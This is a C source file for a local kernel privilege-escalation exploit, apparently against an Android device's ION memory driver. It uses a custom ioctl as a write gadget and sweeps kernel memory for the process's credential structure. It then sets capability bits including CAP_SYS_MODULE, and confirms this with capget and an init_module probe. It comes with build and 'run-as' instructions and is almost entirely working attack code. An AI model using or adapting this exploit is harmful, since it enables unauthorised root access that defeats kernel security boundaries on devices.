/* approot5.c - the app-context first root, in the shape the chain already uses.
 *
 * The earlier probes tried to detect "this is my own credential" by watching
 * getuid() change during the sweep, with a small store budget. That cannot work:
 * the guard word 192 appears hundreds of times across the map, so a budget of a
 * few dozen is spent on strangers long before the real credential comes round.
 *
 * charepa's find_cred does it the other way: it collects every candidate whose
 * guard word matches, then tests each one with a targeted capability write and
 * reads the result back through capget. That is what this program does, with the
 * anchor changed from cap_bset to cred->usage so that an app process - whose
 * CapBnd is 0 - has a reachable word at all.
 *
 * Two ways to make usage equal a usable fd number:
 *   191 parked threads  -> usage 192, fd 192, IOVA 0x800C0000
 *   no threads          -> usage 2,   fd 2,   IOVA 0x80002000
 *
 * Run: run-as com.charepa ./approot5 <threads> <lo> <hi> <budget>
 *
 * Build: aarch64-linux-gnu-gcc -static -O2 -pthread -o approot5 approot5.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/mman.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000
#define CRED_STEP 192
#define CRED_SLOTS 21
#define CAP_SYS_MODULE_BIT 16

struct cap_hdr { u32 version; s32 pid; };
struct cap_data { u32 eff, prm, inh; };

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static u32 eff_of(int pid){
    struct cap_hdr h; struct cap_data d[2];
    memset(&h, 0, sizeof h); memset(d, 0, sizeof d);
    h.version = 0x20080522; h.pid = pid;
    if (syscall(SYS_capget, &h, d) < 0) return 0xFFFFFFFFu;
    return d[0].eff;
}
static int mk_buf(int *out_fd, u32 *out_iova){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    *out_iova = 0;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) *out_iova = p.addr;
    *out_fd = d.fd;
    return 1;
}
static int carve(u32 want, int *out_fd){
    static int held[2048]; int n = 0;
    while (n < 2000){
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv == want){ *out_fd = f; for (int i = 0; i < n; i++) close(held[i]); return 1; }
        held[n++] = f;
    }
    for (int i = 0; i < n; i++) close(held[i]);
    return 0;
}
static void *park(void *p){ (void)p; for (;;) pause(); return NULL; }

/* fd that must hold the guard buffer: fd 0 is stdin and already open, so the
 * guard fd has to be a positive number that the buffer can be placed on */
int main(int argc, char **argv){
    int want_threads = argc > 1 ? atoi(argv[1]) : 0;
    u32 lo = argc > 2 ? (u32)strtoul(argv[2], NULL, 16) : 0x02000000u;
    u32 hi = argc > 3 ? (u32)strtoul(argv[3], NULL, 16) : 0x7f000000u;
    long budget = argc > 4 ? atol(argv[4]) : 20000;

    /* the app cannot write /data/local/tmp; log beside the binary instead */
    { char lp[512]; snprintf(lp, sizeof lp, "%s.log", argv[0]);
      LOG = fopen(lp, "w"); if (!LOG) LOG = stdout; }
    setbuf(LOG, NULL);
    say("approot5 uid=%d pid=%d want_threads=%d window=0x%08x..0x%08x budget=%ld\n",
        getuid(), getpid(), want_threads, lo, hi, budget);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        say("fds soft=%ld hard=%ld\n", (long)rl.rlim_cur, (long)rl.rlim_max);
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    for (int i = 0; i < want_threads; i++){
        pthread_t t;
        if (pthread_create(&t, NULL, park, NULL) != 0) break;
        pthread_detach(t);
    }
    usleep(20000);

    int threads = -1;
    { FILE *f = fopen("/proc/self/status", "r");
      if (f){ char l[256]; while (fgets(l, sizeof l, f))
          if (!strncmp(l, "Threads:", 8)) { threads = atoi(l + 8); break; } fclose(f); } }
    /* execve installs a copy of the credential, so usage is tasks + 1 unless the
     * threads were made after the exec - which they were, so usage == threads. */
    int guard = threads;
    say("Threads=%d -> guard word %d\n", threads, guard);
    if (guard < 1 || guard > 4000){ say("guard %d is not a usable fd\n", guard); return 0; }

    u32 giova = 0x80000000u | ((u32)guard << 12);
    int g;
    if (!carve(giova, &g)){ say("no buffer with iova 0x%08x\n", giova); return 0; }
    if (g != guard){
        if (dup2(g, guard) < 0){ say("dup2(%d) errno=%d\n", guard, errno); return 0; }
        close(g);
    }
    say("guard buffer on fd %d, iova 0x%08x\n", guard, giova);

    /* Phase A: collect every slot whose first word is the guard. No write happens
     * on a miss; a match costs one 4-byte store at +4, which is what the chain
     * also accepts. */
    static u64 cand[8192]; int nc = 0;
    long probes = 0, stores = 0, hits = 0;
    for (u32 p = lo; p < hi && nc < 8192; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int s = 0; s < CRED_SLOTS; s++){
            u64 o = pg + (u64)s * CRED_STEP;
            if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
            probes++;
            if (gate(o) != 0) continue;
            hits++; stores++;
            if (nc < 8192) cand[nc++] = o;
            if (stores > budget) { say("budget spent (%ld)\n", stores); break; }
        }
        if (stores > budget) break;
    }
    say("phase A probes=%ld stores=%ld candidates=%d\n", probes, stores, nc);

    /* Phase B: one targeted capability write per candidate. fd 0 must be a
     * dmabuf so that the zero word at +52 passes the gate; the store lands at
     * +56, i.e. cap_effective. capget then says which candidate was ours. */
    u32 cap_page = 528u;                       /* bits 16 and 21 */
    int c;
    if (!carve(0x80000000u | (cap_page << 12), &c)){ say("no capability buffer\n"); return 0; }
    /* dup2(0,0) is a no-op and closing afterwards frees fd 0: measured in
       charepa itself, and the same defect is possible here because 0 can be
       the lowest free descriptor. Keep it when it already landed right, and
       verify the gate rather than assuming it. */
    if (c != 0){
        if (dup2(c, 0) < 0){ say("dup2(0) errno=%d\n", errno); return 0; }
        close(c);
    } else {
        say("capability buffer already at fd 0; keeping it\n");
    }
    { u8 *pg = mmap(NULL, PGSZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
      if (pg != MAP_FAILED){ *(u32*)pg = 0;
        int g0 = gate((u64)(uintptr_t)pg); munmap(pg, PGSZ);
        say("zero-word gate rc=%d (0 needed)\n", g0);
        if (g0 != 0){ say("APPROOT5 DONE (fd 0 is not the dmabuf)\\n"); return 0; } } }
    u64 mine = 0; long granted = 0;
    for (int i = 0; i < nc && !mine; i++){
        if (gate(cand[i] + 52) != 0) continue;
        granted++;
        u32 e = eff_of(0);
        if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))) mine = cand[i];
    }
    say("phase B granted=%ld own_cred=%s\n", granted, mine ? "yes" : "no");
    if (!mine){ say("APPROOT5 DONE (no own cred)\n"); return 0; }
    say("own cred at 0x%llx\n", (unsigned long long)mine);

    errno = 0;
    syscall(105, "\x7f""ELF", 4UL, "");
    say("probe_module errno=%d (8 = CAP_SYS_MODULE held and image refused)\n", errno);
    say("APPROOT5 DONE\n");
    return 0;
}
